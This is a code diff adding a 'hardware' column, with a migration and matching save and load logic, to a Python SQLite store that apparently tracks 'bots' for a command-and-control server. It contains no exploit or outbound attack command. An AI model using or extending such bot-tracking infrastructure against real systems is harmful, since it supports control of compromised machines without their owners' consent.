@@ -51,6 +51,7 @@ def init_db():
         os TEXT,
         user TEXT,
         modules TEXT,
+        hardware TEXT,
         first_seen REAL,
         last_seen REAL
     );
@@ -64,7 +65,7 @@ def init_db():
 
 
 def _migrate_bots_columns():
-    """Добавляет agent_name и meepo_num, если их нет (для существующих баз)."""
+    """Добавляет agent_name, meepo_num и hardware, если их нет."""
     if _conn is None:
         return
     try:
@@ -75,6 +76,9 @@ def _migrate_bots_columns():
         if "meepo_num" not in cols:
             _conn.execute("ALTER TABLE bots ADD COLUMN meepo_num INTEGER")
             print("[+] migration: added bots.meepo_num")
+        if "hardware" not in cols:
+            _conn.execute("ALTER TABLE bots ADD COLUMN hardware TEXT")
+            print("[+] migration: added bots.hardware")
     except Exception as e:
         print(f"[!] migration error: {e}")
 
@@ -124,8 +128,8 @@ def save_bot(b: dict):
     try:
         _conn.execute("""
             INSERT INTO bots (bot_id, agent_name, meepo_num, hostname, os, user,
-                              modules, first_seen, last_seen)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+                              modules, hardware, first_seen, last_seen)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
             ON CONFLICT(bot_id) DO UPDATE SET
                 agent_name=excluded.agent_name,
                 meepo_num=excluded.meepo_num,
@@ -133,6 +137,7 @@ def save_bot(b: dict):
                 os=excluded.os,
                 user=excluded.user,
                 modules=excluded.modules,
+                hardware=excluded.hardware,
                 last_seen=excluded.last_seen
         """, (
             b["bot_id"],
@@ -142,6 +147,8 @@ def save_bot(b: dict):
             b.get("info", {}).get("os"),
             b.get("info", {}).get("user"),
             json.dumps(b.get("modules", []), ensure_ascii=False),
+            json.dumps(b.get("info", {}).get("hardware"), ensure_ascii=False)
+                if b.get("info", {}).get("hardware") is not None else None,
             b.get("first_seen", time.time()),
             b.get("last_seen", time.time()),
         ))
@@ -199,12 +206,23 @@ def load_all_bots() -> List[dict]:
         rows = _conn.execute("SELECT * FROM bots").fetchall()
         out = []
         for r in rows:
+            info = {"os": r["os"], "user": r["user"]}
+            # hardware — новая колонка, может отсутствовать в старых базах
+            try:
+                hw_raw = r["hardware"]
+            except (IndexError, KeyError):
+                hw_raw = None
+            if hw_raw:
+                try:
+                    info["hardware"] = json.loads(hw_raw)
+                except Exception:
+                    pass
             out.append({
                 "bot_id": r["bot_id"],
                 "agent_name": r["agent_name"],
                 "meepo_num": r["meepo_num"],
                 "hostname": r["hostname"],
-                "info": {"os": r["os"], "user": r["user"]},
+                "info": info,
                 "modules": json.loads(r["modules"]) if r["modules"] else [],
                 "first_seen": r["first_seen"],
                 "last_seen": r["last_seen"],
